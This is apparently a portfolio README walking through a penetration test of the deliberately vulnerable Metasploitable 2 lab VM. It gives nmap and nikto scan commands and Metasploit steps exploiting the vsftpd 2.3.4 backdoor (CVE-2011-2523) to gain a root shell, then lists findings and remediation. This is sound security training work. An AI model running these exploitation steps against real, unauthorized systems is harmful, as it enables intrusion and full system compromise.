# 🛡️ Metasploitable 2 – Vulnerability Assessment & Penetration Testing (VAPT)

This project demonstrates a **full penetration testing workflow** on Metasploitable 2, a deliberately vulnerable VM.  
The goal was to simulate a real-world **Vulnerability Assessment and Penetration Test (VAPT)** and produce a consultancy-style report.

---

## 🔹 Project Roadmap

![Project Roadmap](assets/roadmap_infographic.png)

---

## 🔹 Steps Performed

### 1️⃣ Reconnaissance (Nmap)
- Scanned target IP for open ports and services
```bash
nmap -sV 192.168.124.130 -oN nmap_results.txt
📸

2️⃣ Vulnerability Scanning
Nmap vulnerability scripts

bash
Copy code
nmap -sV --script vuln 192.168.124.130 -oN vuln_results.txt
Nikto web scan

bash
Copy code
nikto -h http://192.168.124.130 -output nikto_results.txt
📸

3️⃣ Exploitation (Metasploit)
Exploited vsftpd 2.3.4 backdoor (CVE-2011-2523)

bash
Copy code
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.124.130
run
📸

Verified root access:

bash
Copy code
whoami
📸 (root shell proof)

4️⃣ Reporting
Documented findings, CVEs, and remediation

Delivered a professional consultancy-style report (PDF)

🔹 Deliverables
📄 Full Report (PDF)
🖼️ Roadmap infographic in /assets
📸 Proof screenshots in /screenshots

🔹 Tools Used
Kali Linux

Nmap

Nikto

Metasploit Framework

🔹 Key Findings
Critical: FTP backdoor (vsftpd 2.3.4 – CVE-2011-2523) → Remote root access

High: Outdated Apache 2.2.8 & PHP 5.2.4

Medium: Missing HTTP security headers

🔹 Author
👤 Gufran Ahmed

🔗 LinkedIn- https://www.linkedin.com/in/gufran-uh/ 
